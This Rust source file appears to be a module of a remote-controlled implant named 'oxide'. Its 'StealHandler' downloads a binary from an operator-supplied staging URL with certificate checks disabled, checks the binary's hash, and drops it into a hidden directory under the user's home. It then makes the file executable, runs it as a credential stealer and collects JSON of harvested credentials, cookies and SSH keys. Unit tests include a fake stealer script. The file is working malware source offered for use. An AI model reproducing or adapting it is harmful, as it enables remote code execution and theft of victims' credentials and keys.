use anyhow::{anyhow, Context, Result};
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::fs;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};
use uuid::Uuid;

use super::CommandHandler;

pub struct StealHandler;

struct TempFile(String);
impl Drop for TempFile {
    fn drop(&mut self) {
        let _ = fs::remove_file(&self.0);
    }
}

impl CommandHandler for StealHandler {
    fn execute(&self, args: Value) -> Result<Value> {
        tokio::task::block_in_place(|| execute_steal(args))
    }
}

fn execute_steal(args: Value) -> Result<Value> {
    let payload_id = args["payload_id"]
        .as_str()
        .ok_or_else(|| anyhow!("missing payload_id"))?;
    let sha256_expected = args["sha256"]
        .as_str()
        .ok_or_else(|| anyhow!("missing sha256"))?;
    let staging_url = args["staging_url"]
        .as_str()
        .ok_or_else(|| anyhow!("missing staging_url"))?;
    let timeout_secs = args["timeout_secs"].as_u64().unwrap_or(60);

    let url = format!(
        "{}/api/staging/{}",
        staging_url.trim_end_matches('/'),
        payload_id
    );
    let bytes = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .context("build staging client")?
        .get(&url)
        .send()
        .context("staging fetch failed")?
        .error_for_status()
        .context("staging endpoint returned error")?
        .bytes()
        .context("reading response bytes")?;

    validate_sha256(&bytes, sha256_expected)?;
    let tmp_path = write_temp(&bytes)?;
    let _cleanup = TempFile(tmp_path.clone());
    let stdout = run_subprocess(&tmp_path, timeout_secs)?;
    parse_output(&stdout)
}

pub(crate) fn validate_sha256(bytes: &[u8], expected: &str) -> Result<()> {
    let actual = hex::encode(Sha256::digest(bytes));
    if actual != expected {
        return Err(anyhow!(
            "sha256 mismatch: expected {expected}, got {actual}"
        ));
    }
    Ok(())
}

fn write_temp(bytes: &[u8]) -> Result<String> {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let tmp_dir = std::path::Path::new(&home).join(".local/share/oxide/.tmp");
    fs::create_dir_all(&tmp_dir).context("create temp dir")?;
    let path = tmp_dir.join(Uuid::new_v4().to_string());
    fs::write(&path, bytes).context("write temp binary")?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&path, fs::Permissions::from_mode(0o755))
            .context("chmod temp binary")?;
    }
    Ok(path.to_string_lossy().into_owned())
}

pub(crate) fn run_subprocess(path: &str, timeout_secs: u64) -> Result<Vec<u8>> {
    // oxide-stealer outputs JSON to stdout by default (no --json flag needed)
    let mut child = Command::new(path)
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .context("failed to spawn stealer subprocess")?;

    let deadline = Instant::now() + Duration::from_secs(timeout_secs);
    loop {
        match child.try_wait().context("try_wait")? {
            Some(_) => {
                return Ok(child.wait_with_output().context("wait_with_output")?.stdout)
            }
            None => {
                if Instant::now() > deadline {
                    let _ = child.kill();
                    return Err(anyhow!("stealer timed out after {timeout_secs}s"));
                }
                std::thread::sleep(Duration::from_millis(200));
            }
        }
    }
}

pub(crate) fn parse_output(stdout: &[u8]) -> Result<Value> {
    serde_json::from_slice(stdout).with_context(|| {
        format!(
            "failed to parse stealer JSON: {}",
            String::from_utf8_lossy(stdout)
                .chars()
                .take(200)
                .collect::<String>()
        )
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_sha256_correct() {
        let data = b"hello oxide";
        let expected = hex::encode(Sha256::digest(data));
        assert!(validate_sha256(data, &expected).is_ok());
    }

    #[test]
    fn test_validate_sha256_mismatch() {
        let err = validate_sha256(b"hello oxide", "deadbeef").unwrap_err();
        assert!(err.to_string().contains("sha256 mismatch"));
    }

    #[test]
    fn test_parse_output_valid() {
        let stdout = br#"{"credentials":[],"cookies":[],"ssh_keys":[],"errors":[],"collection_time_ms":5}"#;
        let val = parse_output(stdout).unwrap();
        assert!(val["credentials"].is_array());
    }

    #[test]
    fn test_parse_output_invalid() {
        let err = parse_output(b"not json").unwrap_err();
        assert!(err.to_string().contains("parse"));
    }

    #[cfg(unix)]
    #[test]
    fn test_run_subprocess_fake_stealer() {
        use std::os::unix::fs::PermissionsExt;
        let tmp = std::env::temp_dir().join("oxide_fake_stealer_test");
        std::fs::write(
            &tmp,
            b"#!/bin/sh\nprintf '{\"credentials\":[],\"cookies\":[],\"ssh_keys\":[],\"errors\":[],\"collection_time_ms\":1}'\n",
        )
        .unwrap();
        std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o755)).unwrap();
        let stdout = run_subprocess(tmp.to_str().unwrap(), 10).unwrap();
        let _ = std::fs::remove_file(&tmp);
        let val = parse_output(&stdout).unwrap();
        assert!(val["credentials"].is_array());
    }

    #[test]
    fn staging_client_built_with_invalid_cert_flag() {
        // Confirms danger_accept_invalid_certs is available in reqwest 0.12 with rustls-tls.
        let client = reqwest::blocking::Client::builder()
            .danger_accept_invalid_certs(true)
            .build();
        assert!(client.is_ok(), "client builder failed: {:?}", client.err());
    }
}
